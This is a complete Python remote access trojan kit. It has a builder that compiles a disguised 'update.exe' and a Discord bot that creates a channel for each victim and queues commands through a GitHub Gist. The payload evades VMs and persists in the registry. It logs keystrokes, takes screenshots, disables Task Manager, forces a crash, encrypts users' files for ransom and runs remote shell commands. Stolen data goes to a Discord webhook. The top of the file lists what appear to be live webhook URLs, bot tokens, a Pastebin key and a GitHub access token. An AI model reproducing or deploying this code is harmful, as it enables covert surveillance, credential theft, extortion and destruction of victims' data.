pip install requests pillow pynput cryptography pywin32 pyinstaller pyperclip discord.py

https://discord.com/api/webhooks/1453489886308073522/o9Bg9jBIWlj8nUGlYdMWHlLALtzIoIedkwtioTFgFPVX3SEo7WeolqoqEvZUbSA1W1JB

MTQ1MzQ4Njg3ODk3MDg3MTk3Mg.GSV3BK.YJhYzr25_Tef s0VAH5VMeZnEPCvJXyKZ5JlNVU

server id = 1264299849063333919

Channel id = 1264299849604661331

https://pastebin.com/raw/m5U6eger

pastebin key = mGiXZ4yQB6I4SArToIF1bs6v7fZPv9Fc

gist = github_pat_11BLDDYKY03UNDKNisFEgJ_gI0xxpIHOOM  xnUrIixZPrVy8B6LkxvWdwN0bjjVxYYnYNZO65RL9jmBWnmQ

gist id = 3bc0ef1bad059fdf147b42ea06bca7df/raw/2ba7b196ba08fd25d0d34cdcda8e88ca4a3c51bf

gist = https://gist.githubusercontent.com/IDKwhyimhereDoyou/3bc0ef1bad059fdf147b42ea06bca7df/raw/2ba7b196ba08fd25d0d34cdcda8e88ca4a3c51bf/commands.json

import os
import subprocess
import shutil

webhook_url = input("Discord webhook URL: ").strip()
command_url = input("Pastebin raw URL (with {}): ").strip()
output_name = "update.exe"

rat_code = f'''
import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
from PIL import ImageGrab
from pynput.keyboard import Listener, Key
from cryptography.fernet import Fernet
import winreg

WEBHOOK_URL = "{webhook_url}"
COMMAND_URL = "{command_url}"
POLL_INTERVAL = 15
VICTIM_ID = hashlib.md5((getpass.getuser() + socket.gethostname()).encode()).hexdigest()[:8]
KEYLOG_BUFFER = ""

def send(msg="", embed=None, file=None):
    if msg: msg = f"[{{VICTIM_ID}}] {{msg}}"
    if embed and "title" in embed: embed["title"] = f"[{{VICTIM_ID}}] {{embed['title']}}"
    data = {{"content": msg}}
    if embed: data["embeds"] = [embed]
    files = {{"file": file}} if file else None
    try: requests.post(WEBHOOK_URL, json=data, files=files, timeout=10)
    except: pass

def info():
    try: ip = requests.get("https://api.ipify.org", timeout=5).text
    except: ip = "Unknown"
    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
    send(embed=embed)

def anti_vm():
    try:
        if any(x in subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower() for x in ["virtual", "vmware", "vbox"]):
            sys.exit(0)
    except: pass

def elevate():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

def persist():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "UpdateCheck", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    except: pass

def on_press(key):
    global KEYLOG_BUFFER
    try: KEYLOG_BUFFER += key.char
    except: KEYLOG_BUFFER += f" [{{str(key)}}] "
    if len(KEYLOG_BUFFER) > 500:
        send(f"Keylog dump:\\n{{KEYLOG_BUFFER}}")
        KEYLOG_BUFFER = ""

def screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    send("Screenshot", file=("ss.png", buf, "image/png"))

def lock_pc():
    ctypes.windll.user32.LockWorkStation()
    send("Workstation locked")

def disable_tm():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        send("Task Manager disabled")
    except: pass

def enable_tm():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        send("Task Manager enabled")
    except: pass

def bsod():
    send("Triggering BSOD...")
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

def encrypt(path=os.path.expanduser("~\\Desktop")):
    key = Fernet.generate_key()
    f = Fernet(key)
    send(f"ENCRYPTION KEY - SAVE IT: {{key.decode()}}")
    count = 0
    exts = (".docx",".pdf",".jpg",".png",".txt",".xlsx")
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(exts):
                fp = os.path.join(root, file)
                try:
                    with open(fp,"rb") as d: enc = f.encrypt(d.read())
                    with open(fp+".locked","wb") as o: o.write(enc)
                    os.remove(fp)
                    count += 1
                except: pass
    send(f"Encrypted {{count}} files")

def shell(cmd):
    try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except Exception as e: out = str(e)
    send(f"Shell output:\\n{{out[:3000]}}")

def poll():
    while True:
        try:
            cmds = requests.get(COMMAND_URL, timeout=10).json()
            if str(VICTIM_ID) in cmds:
                full = cmds[str(VICTIM_ID)].strip()
                parts = full.split(" ", 1)
                cmd = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""
                if cmd in ["ss","screenshot"]: screenshot()
                elif cmd == "lock": lock_pc()
                elif cmd == "disabletm": disable_tm()
                elif cmd == "enabletm": enable_tm()
                elif cmd == "bsod": bsod()
                elif cmd == "encrypt": encrypt(arg or None)
                elif cmd == "shell": shell(arg)
        except: pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    anti_vm()
    elevate()
    persist()
    info()
    threading.Thread(target=poll, daemon=True).start()
    with Listener(on_press=on_press) as l:
        l.join()
'''

with open("rat.py", "w") as f: f.write(rat_code)

print("Building bulletproof EXE...")
subprocess.run([
    "pyinstaller","--onefile","--noconsole",
    "--collect-all","pynput",
    "--hidden-import=pynput.keyboard._win32",
    "--hidden-import=pynput._util.win32",
    "--name",output_name,"rat.py"
])

shutil.rmtree("build", ignore_errors=True)
shutil.rmtree("__pycache__", ignore_errors=True)
os.remove("rat.py") if os.path.exists("rat.py") else None
os.remove("rat.spec") if os.path.exists("rat.spec") else None

print(f"EXE ready: dist\\{output_name}")




import discord
import re
import requests
import json

TOKEN = "YOUR_DISCORD_BOT_TOKEN"
GUILD_ID = 123456789012345678  # Server ID
LOG_CHANNEL_ID = 987654321098765432  # Webhook channel ID
GIST_ID = "YOUR_GIST_ID_HERE"  # The long hex from URL
GH_TOKEN = "YOUR_GH_PERSONAL_ACCESS_TOKEN_HERE"  # ghp_...

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

known_victims = set()

# Fixed raw URL - bake this into EVERY RAT you build from now on
FIXED_RAW_URL = "https://gist.githubusercontent.com/YOURUSERNAME/YOUR_GIST_ID/raw/commands.json"

def update_gist(commands_dict):
    url = f"https://api.github.com/gists/{GIST_ID}"
    headers = {
        "Authorization": f"token {GH_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    data = {
        "files": {
            "commands.json": {
                "content": json.dumps(commands_dict)
            }
        }
    }
    r = requests.patch(url, headers=headers, json=data)
    if r.status_code == 200:
        print("[+] Gist updated")
    else:
        print("[-] Gist update failed:", r.text)

async def create_victim_section(vid):
    guild = client.get_guild(GUILD_ID)
    cat = await guild.create_category(f"Victim-{vid}")
    ch = await cat.create_text_channel(f"logs-{vid}", overwrites={
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
    })
    return ch

@client.event
async def on_ready():
    print(f"[+] Bot online - FIXED RAW URL (use in builder): {FIXED_RAW_URL}")

@client.event
async def on_message(message):
    if message.author.bot: return

    # Bite detection
    if message.channel.id == LOG_CHANNEL_ID:
        text = message.content
        for embed in message.embeds:
            text += str(embed.to_dict())
        if "WE GOT A BITE CAPTAIN" in text.upper():
            vid_match = re.search(r"\[([a-f0-9]{8})\]", text)
            if vid_match:
                vid = vid_match.group(1)
                if vid not in known_victims:
                    known_victims.add(vid)
                    ch = await create_victim_section(vid)
                    await message.reply(f"**BITE** Victim **{vid}** → {ch.mention}")

    # Commands in victim channels
    if message.channel.name.startswith("logs-") and message.content.startswith("-"):
        vid = message.channel.name.split("-")[1][:8]
        parts = message.content[1:].strip().split(" ", 1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""
        
        full_cmd = cmd
        if cmd in ["encrypt", "shell"]:
            full_cmd += " " + arg
        
        # Load current + add new command
        try:
            current = requests.get(FIXED_RAW_URL).json()
        except:
            current = {}
        current[vid] = full_cmd
        update_gist(current)
        
        await message.reply(f"**{full_cmd}** queued for **{vid}**\nNo rebuild needed — command live in <30s")

client.run(TOKEN)
